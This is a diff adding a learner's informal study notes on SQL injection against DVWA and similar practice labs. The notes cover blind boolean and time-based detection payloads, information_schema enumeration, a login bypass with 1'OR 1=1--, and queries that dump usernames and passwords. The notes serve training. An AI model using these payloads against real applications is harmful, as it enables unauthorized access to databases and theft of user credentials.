@@ -1,0 +1,138 @@
+Hacksplanning website
+
+email: test
+password: 
+login
+
+this is the example of the website we wan to inject
+
+first of all:
+use single quote to try first got error?
+then if blind sql injection 
+🔎 How to Detect Blind SQL Injection
+1. Boolean-based (True/False) detection
+
+Inject something that’s always true vs. always false.
+
+Example (in DVWA or a test lab):
+
+' AND 1=1--
+
+
+vs
+
+' AND 1=2--
+
+If 1=1 gives a normal response but 1=2 gives a different response (shorter page, “login failed”, missing results), → possible boolean-based blind SQLi.
+
+2. Time-based detection
+Use a payload that makes the database wait.
+Example (MySQL in DVWA):
+
+' AND SLEEP(5)--
+If the page response is delayed by ~5 seconds, that means your injection is running in the backend → time-based blind SQLi confirmed.
+
+3. Response length/status code changes
+In Burp Repeater, compare response length:
+True condition → 1124 bytes
+False condition → 1070 bytes
+Even if the page “looks the same,” these tiny changes mean you can infer data.
+
+✅ Signs You Found Blind SQLi
+
+No SQL error messages, but:
+Page behaves differently on true/false conditions.
+Response size changes between true/false payloads.
+Response time changes when using delay functions.
+
+
+
+
+
+2. Checking the Current Database
+
+
+select database() --
+
+
+This command tells you which database is currently being used.
+
+3. Listing Schemas (Databases)
+
+select schema_name 
+from information_schema.schemata --
+
+In MySQL:
+SELECT schema_name FROM information_schema.schemata;
+
+In PostgreSQL:
+SELECT schema_name FROM information_schema.schemata;
+
+In SQL Server:
+SELECT name FROM sys.databases;
+
+In Oracle:
+SELECT username FROM all_users;
+
+information_schema.schemata is a system table that contains all databases (schemas).
+This lets you list every database the server has.
+
+4. Listing Tables in a Database
+
+
+select table_name 
+from information_schema.tables 
+where table_schema = 'dvwa' --
+
+
+
+This lists all tables inside the dvwa database.
+Example: users, guestbook, etc.
+
+5. Listing Columns in a Table
+
+
+select column_name 
+from information_schema.columns 
+where table_schema = 'dvwa' 
+and table_name = 'users' --
+
+This lists all columns inside the users table.
+Example: user_id, username, password, etc.
+
+6. Extracting Data
+
+
+select user_id, first_name, last_name, user, password 
+from users --
+
+Once you know the table + column names, you can dump actual user credentials.
+
+
+
+
+
+
+
+
+
+
+
+
+
+owasp2013 A1-SQL-SQLI-extract data userinfo(sql)
+1' and database() like 'd% 
+'da%
+'dvw keep testing 
+'dvwa
+burpsuite to 
+
+SELECT *
+FROM users
+WHERE email='test' AND password='1 'OR 1=1--' (inject 1'OR 1=1--) -- only use when there is an end if not 1 'or '1' = '1 
+
+after know database we can inject something
+select concat(user,password) from dvwa.users--
+
+dvwa sql injection change to medium it is now using a variable so no need ' single quote to close it
+
